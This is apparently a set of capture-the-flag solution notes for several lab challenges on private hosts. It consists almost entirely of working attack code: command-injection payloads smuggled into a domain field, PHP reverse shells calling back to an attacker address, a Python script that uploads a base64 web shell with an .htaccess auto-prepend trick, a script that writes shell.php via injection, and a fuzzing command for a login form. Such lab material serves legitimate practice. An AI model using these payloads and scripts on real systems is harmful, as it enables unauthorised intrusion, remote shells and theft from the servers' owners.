# TOTOBU
```
google.com > /dev/null; rm err 2>&1
```
## Generate rev shell
```
google.com > /dev/null; php -r '$sock=fsockopen("10.8.0.16",4444);shell_exec("sh <&3 >&3 2>&3");'
```

```
find / -name flag* -exec cat {} + 2> /dev/null
```

# Kujang
```
http://10.10.0.108/upload.php
```
## Create rev shell
```python
import requests, base64, urllib.parse

URL = "http://10.10.0.108"
UPLOADTO = "/upload.php"
LHOST = "10.8.0.16"
LPORT = "4445"

def backdoor():
    payload_htaccess = """AddType application/x-httpd-php .txt
    php_value auto_prepend_file "php://filter/convert.base64-decode/resource=payload.txt\""""

    payload = "<?php system($_GET['cmd']); ?>"
    payload = base64.b64encode(payload.encode('utf-8')).decode('utf-8')
    
    files = {
        'file_upload': (
            'payload.txt', 
            payload,
        )
    }

    requests.post(URL + UPLOADTO, files = files)
    files = {
        'file_upload': (
            '.htaccess', 
            payload_htaccess,
        )
    }
    requests.post(URL + UPLOADTO, files = files)

def main():
    backdoor()
    cmd = f"""php -r '$sock=fsockopen("{LHOST}",{LPORT});exec("sh <&3 >&3 2>&3");'"""
    cmd = urllib.parse.quote_plus(cmd)
    r = requests.get(URL + f'/payload.txt?cmd={cmd}')
    print(r.text)
    
if __name__ == "__main__":
    main()
```

# 
```
http://10.10.0.113/readme.txt
```

```
ffuf -w /path/to/postdata.txt -X POST -d "email=FUZZ@cyberacademy.id\&password=asd&submit=" -u http://10.10.0.113/proses.php
```

## TOMBAK
```
google.com 2>/dev/null | pwd
```

```
google.com 2>/dev/null | echo '<? system($_GET["cmd"]) ?>' > shell.php
```

```python
import requests, base64, urllib.parse

URL = "http://10.10.0.103"
DATA = {"domain": """google.com 2>/dev/null | echo '<? system($_GET["cmd"]) ?>' > shell.php"""}

r = requests.post(URL, data=DATA)

REVSHELL = """php -r '$sock=fsockopen("10.8.0.16",4444);exec("sh <&3 >&3 2>&3");'"""
REVSHELL = urllib.parse.quote_plus(REVSHELL)
r = requests.get(URL + "/shell.php?cmd="+REVSHELL)
print(r.text)
```